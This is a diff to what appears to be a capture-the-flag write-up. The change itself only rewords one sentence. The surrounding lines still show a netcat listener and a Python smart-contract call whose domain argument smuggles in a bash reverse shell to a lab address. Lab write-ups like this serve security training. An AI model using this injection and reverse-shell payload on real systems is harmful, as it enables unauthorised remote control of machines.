@@ -540,7 +540,7 @@ I opted for the "easy" route, and settled with a `bash` reverse shell. I set up 
 nc -lnvp 9001
 ```
 
-And then proceeded to obtain a shell on that port with this command in my `python` session:
+I then proceeded to obtain a shell on that port with this command in my `python` session:
 
 ```python
 +>>> contract.functions.setDomain("10.10.14.34; bash -c 'bash -i >& /dev/tcp/10.10.14.34/9001 0>&1'").transact()
